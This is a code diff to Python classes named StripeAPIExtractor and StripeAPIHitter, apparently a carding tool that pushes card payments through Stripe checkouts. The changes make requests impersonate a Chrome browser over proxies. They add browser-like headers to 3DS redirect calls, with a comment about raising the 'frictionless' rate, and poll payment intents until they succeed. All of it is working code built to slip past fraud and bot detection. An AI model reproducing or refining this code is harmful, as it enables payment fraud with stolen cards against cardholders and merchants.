@@ -78,7 +78,7 @@ class StripeAPIExtractor:
                 proxies = {"http": proxy_url, "https": proxy_url}
                 
             loop = asyncio.get_event_loop()
-            response = await loop.run_in_executor(None, lambda: requests.post(url, headers=headers, data=data, proxies=proxies, timeout=5))
+            response = await loop.run_in_executor(None, lambda: cffi_requests.post(url, headers=headers, data=data, proxies=proxies, timeout=5, impersonate="chrome120"))
             if response.status_code == 200:
                 resp_json = response.json()
                 amount = None
@@ -1064,7 +1064,11 @@ class StripeAPIHitter:
                                 if is_legacy_3ds:
                                     redirect_url = sdk.get("stripe_js") or next_action.get("redirect_to_url", {}).get("url")
                                     if isinstance(redirect_url, str):
-                                        await loop.run_in_executor(None, lambda: cffi_requests.get(redirect_url, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
+                                        redir_headers = {
+                                            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+                                            "user-agent": profile["user_agent"]
+                                        }
+                                        await loop.run_in_executor(None, lambda: cffi_requests.get(redirect_url, headers=redir_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                                     state = "redirected"
                                 elif source:
                                     # --- 3DS Method URL completion (increases frictionless rate) ---
@@ -1233,9 +1237,13 @@ class StripeAPIHitter:
                                 redir_url = next_act_2.get('redirect_to_url', {}).get('url')
                                 ret_url = next_act_2.get('redirect_to_url', {}).get('return_url')
                                 if redir_url:
-                                    await loop.run_in_executor(None, lambda u=redir_url: cffi_requests.get(u, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
+                                    redir_headers = {
+                                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+                                        "user-agent": profile["user_agent"]
+                                    }
+                                    await loop.run_in_executor(None, lambda u=redir_url: cffi_requests.get(u, headers=redir_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                                     await asyncio.sleep(0.5)
-                                    poll_url_3 = f"https://api.stripe.com/v1/{intent_endpoint}/{pi}?key={pk}"
+                                    poll_url_3 = f"https://api.stripe.com/v1/{intent_endpoint}/{pi}?key={pk}&client_secret={client_secret}&is_stripe_sdk=false"
                                     poll_res_3 = await loop.run_in_executor(None, lambda: cffi_requests.get(poll_url_3, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                                     poll_json_3 = poll_res_3.json()
                                     if poll_json_3.get('status') in ['succeeded', 'requires_capture', 'complete']:
